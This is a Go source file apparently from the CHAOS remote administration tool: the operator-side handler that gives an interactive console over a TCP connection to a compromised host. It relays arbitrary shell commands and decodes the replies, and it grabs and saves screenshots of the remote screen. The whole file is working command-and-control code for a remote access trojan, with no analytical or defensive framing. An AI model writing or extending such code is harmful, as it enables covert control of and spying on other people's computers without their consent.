package client

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"github.com/c-bata/go-prompt"
	"github.com/google/uuid"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/internal/handler"
	"github.com/tiagorlampert/CHAOS/internal/ui/completer"
	"github.com/tiagorlampert/CHAOS/pkg/color"
	"github.com/tiagorlampert/CHAOS/pkg/system"
	"github.com/tiagorlampert/CHAOS/pkg/util"
	"net"
	"strings"
)

type ClientHandler struct {
	Connection net.Conn
}

func NewClientHandler(conn net.Conn) handler.Client {
	return &ClientHandler{
		Connection: conn,
	}
}

func (c ClientHandler) HandleConnection(hostname, user string) {
	p := prompt.New(
		c.executor,
		completer.ClientCompleter,
		prompt.OptionPrefix(fmt.Sprintf("%s@%s > ", hostname, user)),
		prompt.OptionPrefixTextColor(prompt.Yellow),
	)
	p.Run()
}

func (c ClientHandler) executor(input string) {
	values := strings.Fields(input)
	for _, v := range values {
		switch strings.TrimSpace(v) {
		case "screenshot":
			fmt.Println(color.Green, "[*] Getting Screenshot...")
			response, _ := SendCommand(c.Connection, input)
			saveScreenshot(response)
			return
		case "exit":
			system.QuitApp()
		default:
			response, _ := SendCommand(c.Connection, input)
			fmt.Println(string(response))
			return
		}
	}
}

func SendCommand(conn net.Conn, input string) ([]byte, error) {
	if err := Write(conn, input); err != nil {
		log.WithField("cause", err.Error()).Error("error sending command to client")
		return nil, err
	}

	message, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		log.WithField("cause", err.Error()).Error("error reading response from connection")
		return nil, err
	}

	decoded, err := base64.StdEncoding.DecodeString(message)
	if err != nil {
		log.WithField("cause", err.Error()).Error("error decoding response from connection")
		return nil, err
	}

	return decoded, err
}

func Write(conn net.Conn, v string) error {
	_, err := conn.Write([]byte(v + util.DelimiterString))
	return err
}

func saveScreenshot(response []byte) {
	util.CreateDirectory(util.TempDirectory)

	filename := fmt.Sprint(util.TempDirectory, uuid.New().String(), ".png")
	if err := util.WriteFile(filename, response); err != nil {
		log.WithField("cause", err.Error()).Error("error writing file")
		return
	}

	fmt.Println(color.Green, "[*] File saved at", filename)
	system.RunCmd(fmt.Sprintf("eog %s", filename), 5)
}
